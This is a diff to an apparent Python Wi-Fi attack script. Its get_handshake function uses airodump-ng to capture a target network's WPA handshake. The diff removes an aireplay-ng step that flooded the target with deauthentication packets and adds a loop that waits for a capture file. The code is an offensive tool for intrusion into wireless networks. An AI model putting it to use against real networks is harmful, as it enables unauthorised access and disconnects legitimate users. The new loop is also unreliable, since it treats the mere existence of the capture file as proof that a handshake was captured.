@@ -86,16 +86,15 @@ def get_handshake(mon_card, bssid, channel):
     print("[*] Capturing handshake...")
     proc = subprocess.Popen(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', savefile, mon_card])
 
-    time.sleep(5)
-    print("[*] Sending deauth packets...")
-    # Increased deauth packets to ensure the client reconnects
-    subprocess.run(['aireplay-ng', '--deauth', '50', '-a', bssid, mon_card], stdout=subprocess.DEVNULL)
-
-    try:
-        # Increased the capture time to 60 seconds to ensure enough time for the handshake
-        time.sleep(60)
-    except KeyboardInterrupt:
-        print("[*] Early stop requested.")
+    # Loop until handshake is captured or user interrupts
+    handshake_captured = False
+    while not handshake_captured:
+        print("[*] Waiting for handshake...")
+        time.sleep(10)
+        if os.path.exists(savefile + "-01.cap"):
+            handshake_captured = True
+        else:
+            print("[*] No handshake captured yet. Retrying...")
 
     proc.terminate()
     capfile = savefile + "-01.cap"
